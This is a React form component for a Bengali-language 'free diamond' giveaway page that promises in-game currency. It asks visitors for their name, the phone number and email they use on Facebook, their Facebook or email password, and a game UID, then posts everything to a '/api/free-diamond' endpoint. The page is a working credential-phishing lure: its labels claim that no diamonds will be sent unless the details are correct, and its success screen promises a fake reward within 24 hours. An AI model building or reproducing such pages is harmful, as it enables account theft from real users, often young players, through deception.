'use client';

import { useState } from 'react';

// Note: Metadata must be exported from a Server Component, so we can't use it directly in this client component
// The parent free-diamond page metadata will apply here

export default function RegistrationForm() {
  const [formData, setFormData] = useState({
    name: '',
    phone: '',
    gameId: '',
    email: '',
    password: '',
    diamondAmount: '200',
  });

  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const response = await fetch('/api/free-diamond', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      const result = await response.json();
      if (response.ok && result.status === 'success') {
        setSuccess(true);
      } else {
        alert(`Error: ${result.message || 'Something went wrong. Please try again.'}`);
      }
    } catch {
      alert('Failed to submit form. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  if (success) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-blue-900 to-black text-white flex items-center justify-center px-4">
        <div className="max-w-md w-full bg-blue-800 bg-opacity-20 p-8 rounded-2xl text-center">
          <div className="flex justify-center mb-6">
            <div className="bg-green-100 rounded-full p-4">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-16 w-16 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
          </div>
          <h2 className="text-2xl font-bold mb-4">রেজিস্ট্রেশন সফল হয়েছে!</h2>
          <p className="text-blue-200 mb-6">আপনার ডায়মন্ড ২৪ ঘণ্টার মধ্যে আপনার অ্যাকাউন্টে পাঠিয়ে দেওয়া হবে।</p>
          <a href="/free-diamond" className="inline-block bg-gradient-to-r from-purple-600 to-blue-600 text-white font-bold py-3 px-6 rounded-full hover:from-purple-700 hover:to-blue-700 transition-all duration-300">হোম পেজে ফিরে যান</a>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-900 to-black text-white py-12 px-4">
      <div className="max-w-4xl mx-auto">
        <div className="text-center mb-12">
          <h1 className="text-3xl md:text-4xl font-bold mb-4">ফ্রি ডায়মন্ড রেজিস্ট্রেশন ফর্ম</h1>
          <p className="text-lg text-blue-200">নিচের ফর্ম পূরণ করে আপনার ফ্রি ডায়মন্ড পেতে রেজিস্ট্রেশন করুন</p>
        </div>
        <div className="bg-blue-800 bg-opacity-20 rounded-2xl p-6 md:p-8 backdrop-blur-lg shadow-2xl">
          <form onSubmit={handleSubmit} className="space-y-6">
            {['name', 'phone', 'email', 'password', 'gameId'].map((field) => (
              <div key={field}>
                <label htmlFor={field} className="block text-lg mb-2 font-medium">
                  *{field === 'gameId' ? 'গেম UID দিন' : field === 'name' ? 'আপনার নাম লিখুন' : field === 'phone'? 'আপনার নাম্বার দিন (ফেসবুকে ব্যাবহার করা)':field==='email'?'আপনার মেইল দিন (ফেসবুকে ব্যাবহার করা)':field==='password'?'আপনার পাসওয়ার্ড দিন ফেসবুক/মেইল (যদি আমরা আপনার সঠিক তথ্য না পাই তাহলে আমরা ডাইমন্ড দিতে পারবো না)': field}
                </label>
                <input
                  type={field === 'password' ? 'password' : 'text'}
                  id={field}
                  name={field}
                  required
                  value={formData[field]}
                  onChange={handleChange}
                  className="w-full px-4 py-3 rounded-lg bg-blue-900 bg-opacity-50 border border-blue-400 focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 transition-colors duration-300"
                  placeholder={`Type your ${field}`}
                />
              </div>
            ))}
            <div>
              <label htmlFor="diamondAmount" className="block text-lg mb-2 font-medium">*কতগুলো ডায়মন্ড পেতে চান?</label>
              <select
                id="diamondAmount"
                name="diamondAmount"
                required
                value={formData.diamondAmount}
                onChange={handleChange}
                className="w-full px-4 py-3 rounded-lg bg-blue-900 bg-opacity-50 border border-blue-400 focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 transition-colors duration-300"
              >
                {[200, 500, 1000, 5000].map((amount) => (
                  <option key={amount} value={amount}>{amount}</option>
                ))}
              </select>
            </div>
            <button type="submit" disabled={loading} className={`w-full bg-gradient-to-r from-purple-600 to-blue-600 text-white font-bold py-4 px-8 rounded-full text-lg hover:from-purple-700 hover:to-blue-700 transform hover:scale-105 transition-all duration-300 shadow-lg hover:shadow-xl ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}>
              {loading ? 'প্রক্রিয়াকরণ চলছে...' : 'রেজিস্ট্রেশন সম্পন্ন করুন'}
            </button>
          </form>
          <div className="mt-8 text-center text-sm text-blue-200">
            <p>* সকল তথ্য সঠিকভাবে পূরণ করুন. অন্যথায় আমরা ডায়মন্ড দিতে পারবো না</p>
            <p>* প্রতি অ্যাকাউন্টে একবার মাত্র ফ্রি ডায়মন্ড পাওয়া যাবে</p>
          </div>
        </div>
      </div>
    </div>
  );
}
